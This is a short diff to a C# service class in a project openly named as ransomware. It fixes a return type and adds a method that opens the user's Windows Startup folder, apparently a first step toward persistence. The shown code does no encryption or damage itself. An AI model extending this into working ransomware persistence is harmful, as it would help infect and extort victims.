@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.Diagnostics;
 using System.Linq;
 using System.Runtime.Serialization;
 using System.ServiceModel;
@@ -22,7 +23,21 @@ namespace RansomwareEncryptionService
 
 		public string getLastEncryptedFile()
 		{
-			return false;
+			return "false";
 		}
+
+		public void startupProgram()
+		{
+			try
+			{
+				string userName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
+				Process.Start($@"C:\Users\{userName}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup");
+			}
+			catch (Exception e)
+			{
+				
+			}
+		}
+
 	}
 }
